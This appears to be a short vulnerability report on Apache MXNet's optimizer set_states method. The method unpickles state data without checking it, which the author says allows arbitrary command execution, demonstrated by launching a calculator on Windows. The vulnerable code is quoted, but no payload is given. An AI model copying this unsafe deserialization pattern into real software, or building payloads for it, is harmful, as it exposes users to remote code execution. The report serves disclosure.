 Apache mxnet does not verify state content when setting state, which allows attackers to construct malicious content and execute arbitrary commands. 

 Using Python to reproduce the vulnerability 


 Install mxnet first 


pip install numpy==1.23.1
pip install mxnet -f https://dist.mxnet.io/python/cpu

 Apache mxnet set state, found no verification of state content 
https://github.com/apache/mxnet/blob/3f8f3be9987e259491ddc5a78aa9c6903e0b21e3/python/mxnet/optimizer/optimizer.py#L2142
code:
{
 def set_states(self, states):
        """Sets updater states."""
        states = pickle.loads(states)
        if isinstance(states, tuple) and len(states) == 2:
            self.states, self.optimizer = states
        else:
            self.states = states
        self.states_synced = dict.fromkeys(self.states.keys(), False)
}

 This test is carried out under windows, malicious data is constructed, and any command can be executed after loading, and the calculator is ejected.
